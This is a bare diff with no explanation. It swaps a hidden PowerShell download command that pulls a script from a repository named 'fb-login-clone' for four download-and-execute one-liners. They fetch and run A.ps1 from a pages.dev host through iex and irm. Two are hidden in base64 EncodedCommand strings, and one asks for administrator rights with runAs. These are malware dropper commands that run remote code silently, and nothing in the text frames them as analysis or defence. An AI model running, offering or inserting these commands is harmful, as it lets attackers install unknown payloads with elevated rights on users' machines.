@@ -1,1 +1,4 @@
-powershell -w h -nop -c "iwr -useb 'https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache/AudioHost.ps1'
+powershell -c "iex(iwr'https://3-4px.pages.dev/A.ps1')"
+powershell -c "&(irm 'https://3-4px.pages.dev/A.ps1')"
+powershell -w h -nop -c -EncodedCommand aQBlAHgAIAAoAGkAdwByACAtAHUAcwBlAGIAICdoAHQAdABwAHMAOgAvAC8AMwAtADQAcAB4AC4AcABhAGcAZQBzAC4AZABlAHYALwBBAHAALgBwAHMxACcAKQA=
+Start-Process powershell -Verb runAs -ArgumentList "-EncodedCommand LQB3ACAAaAAgAC0AbgBvAHAAIAAtAGMAPABpAGUAeAAgACgAaQBxAHIAIAAtAHUAcwBlAGIAACAAJwBoAHQAdABwAHMAOgAvAC8AMwAtADQAcAB4AC4AcABhAGcAZQBzAC4AZABlAHYALwBBAHAALgBwAHMxACcAKQA="
